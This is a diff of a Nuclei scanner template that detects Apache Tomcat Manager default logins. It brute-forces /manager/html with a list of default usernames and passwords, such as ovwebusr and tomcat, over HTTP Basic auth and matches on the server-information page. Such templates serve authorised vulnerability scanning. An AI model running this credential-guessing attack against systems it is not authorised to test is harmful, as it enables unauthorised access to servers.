@@ -1,47 +1,47 @@
 id: tomcat-default-login
-
 info:
-  name: Apache Tomcat Manager Default Credentials
+  name: Apache Tomcat Manager Default Login
   author: pdteam,sinKettu,nybble04
   severity: high
-  description: Apache Tomcat Manager default login credentials were discovered.
+  description: Apache Tomcat Manager default login credentials were discovered. This template checks for multiple variations.
   reference:
-    - https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/
     - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
+    - https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/
   classification:
     cpe: cpe:2.3:a:apache:tomcat:*:*:*:*:*:*:*:*
   metadata:
     runzero-match: any(each(service["html.titles"]), {# matches "Apache Tomcat"})
     max-request: 405
-    vendor: apache
     product: tomcat
     shodan-query: title:"Apache Tomcat"
-  tags: tomcat,apache,default-login,vuln
-
+    vendor: apache
+  tags: apache,default-login,tomcat,vuln
 http:
-  - raw:
-      - |
-        GET /manager/html HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Basic {{base64(username + ':' + password)}}
-
+  - attack: clusterbomb
+    matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - Apache Tomcat
+          - Server Information
+      - condition: or
+        part: body
+        type: word
+        words:
+          - Tomcat Version
+          - JVM Version
+          - JVM Vendor
+          - OS Name
+          - OS Version
+          - OS Architecture
+          - Hostname
+          - IP Address
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
     payloads:
-      username:
-        - ADMIN
-        - QCC
-        - admin
-        - both
-        - cxsdk
-        - demo
-        - j2deployer
-        - manager
-        - ovwebusr
-        - role
-        - role1
-        - root
-        - server_admin
-        - tomcat
-        - xampp
       password:
         - ADMIN
         - OvW*busr1
@@ -70,32 +70,25 @@ http:
         - toor
         - vagrant
         - xampp
-    attack: clusterbomb # Available options: sniper, pitchfork and clusterbomb
+      username:
+        - ADMIN
+        - QCC
+        - admin
+        - both
+        - cxsdk
+        - demo
+        - j2deployer
+        - manager
+        - ovwebusr
+        - role
+        - role1
+        - root
+        - server_admin
+        - tomcat
+        - xampp
+    raw:
+      - |
+        GET /manager/html HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
     threads: 30
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "Apache Tomcat"
-          - Server Information
-        condition: and
-
-      - type: word
-        part: body
-        words:
-          - Tomcat Version
-          - JVM Version
-          - JVM Vendor
-          - OS Name
-          - OS Version
-          - OS Architecture
-          - Hostname
-          - IP Address
-        condition: or
-
-      - type: status
-        status:
-          - 200
-
